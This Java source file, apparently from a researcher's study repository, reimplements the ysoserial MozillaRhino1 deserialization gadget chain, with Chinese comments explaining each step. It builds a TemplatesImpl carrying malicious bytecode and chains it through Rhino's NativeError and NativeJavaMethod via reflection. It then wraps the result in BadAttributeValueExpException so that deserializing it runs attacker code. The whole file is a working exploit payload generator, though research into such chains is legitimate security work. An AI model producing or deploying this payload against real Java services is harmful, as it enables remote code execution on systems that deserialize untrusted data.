package org.su18.serialize.ysoserial.MozillaRhino.MozillaRhino1;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.mozilla.javascript.*;
import org.su18.serialize.ysoserial.Utils.SerializeUtil;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * @author su18
 */
public class MozillaRhino1 {

	public static void main(String[] args) throws Exception {

		// 生成包含恶意类字节码的 TemplatesImpl 类
		TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();

		// 实例化 NativeError 类
		Class<?>       nativeErrorClass       = Class.forName("org.mozilla.javascript.NativeError");
		Constructor<?> nativeErrorConstructor = nativeErrorClass.getDeclaredConstructor();
		nativeErrorConstructor.setAccessible(true);
		Scriptable nativeError = (Scriptable) nativeErrorConstructor.newInstance();

		// 使用恶意类 TemplatesImpl 初始化 NativeJavaObject
		// 这样 unwrap 时会返回 tmpl 实例
		// 由于 NativeJavaObject 序列化时会调用 initMembers() 方法
		// 所以需要在实例化 NativeJavaObject 时也进行相关初始化
		Context          context          = Context.enter();
		NativeObject     scriptableObject = (NativeObject) context.initStandardObjects();
		NativeJavaObject nativeJavaObject = new NativeJavaObject(scriptableObject, tmpl, TemplatesImpl.class);

		// 使用 newTransformer 的 Method 对象实例化 NativeJavaMethod 类
		Method           newTransformer   = TemplatesImpl.class.getDeclaredMethod("newTransformer");
		NativeJavaMethod nativeJavaMethod = new NativeJavaMethod(newTransformer, "name");

		// 使用反射将 nativeJavaObject 写入到 NativeJavaMethod 实例的 prototypeObject 中
		Field prototypeField = ScriptableObject.class.getDeclaredField("prototypeObject");
		prototypeField.setAccessible(true);
		prototypeField.set(nativeError, nativeJavaObject);

		// 将 GetterSlot 放入到 NativeError 的 slots 中
		Method getSlot = ScriptableObject.class.getDeclaredMethod("getSlot", String.class, int.class, int.class);
		getSlot.setAccessible(true);
		Object slotObject = getSlot.invoke(nativeError, "name", 0, 4);

		// 反射将 NativeJavaMethod 实例放到 GetterSlot 的 getter 里
		// ysoserial 调用了 setGetterOrSetter 方法，我这里直接反射写进去，道理都一样
		Class<?> getterSlotClass = Class.forName("org.mozilla.javascript.ScriptableObject$GetterSlot");
		Field    getterField     = getterSlotClass.getDeclaredField("getter");
		getterField.setAccessible(true);
		getterField.set(slotObject, nativeJavaMethod);

		// 生成 BadAttributeValueExpException 实例，用于反序列化触发 toString 方法
		BadAttributeValueExpException exception = new BadAttributeValueExpException("su18");
		Field                         valField  = exception.getClass().getDeclaredField("val");
		valField.setAccessible(true);
		valField.set(exception, nativeError);

		SerializeUtil.writeObjectToFile(exception);
		SerializeUtil.readFileObject();
	}

}
